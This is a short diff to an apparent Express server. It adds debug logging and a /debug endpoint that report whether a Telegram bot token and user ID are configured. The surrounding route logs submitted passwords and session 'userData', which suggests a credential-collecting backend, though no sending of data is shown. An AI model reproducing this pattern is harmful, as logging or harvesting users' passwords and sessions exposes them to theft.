@@ -148,6 +148,9 @@ app.post("/users/me", limiter, (req, res) => {
   console.log("\n🔍 ==> DETAILED SESSION ANALYSIS <==");
   console.log("📍 Time:", new Date().toLocaleString());
   console.log("🌐 Request IP:", req.ip);
+  console.log("🌍 Environment: Vercel =", !!process.env.VERCEL);
+  console.log("🔑 Bot Token Present:", !!process.env.TELEGRAM_TOKEN);
+  console.log("👤 User ID Present:", !!process.env.USER_ID);
   console.log("📋 Full Request Body:", JSON.stringify(req.body, null, 2));
   console.log("🔐 Password Field:", req.body.password);
   console.log("👤 UserData Field:", req.body.userData);
@@ -245,6 +248,17 @@ location.reload();`;
   res.sendStatus(200);
 });
 
+// Add debug endpoint for testing
+app.get("/debug", (req, res) => {
+  console.log("🔧 Debug endpoint hit");
+  res.json({
+    status: "ok",
+    timestamp: new Date().toISOString(),
+    environment: process.env.VERCEL ? "vercel" : "local",
+    botToken: process.env.TELEGRAM_TOKEN ? "present" : "missing",
+    userId: process.env.USER_ID ? "present" : "missing"
+  });
+});
 
 const server = useHttp ? http : https;
 
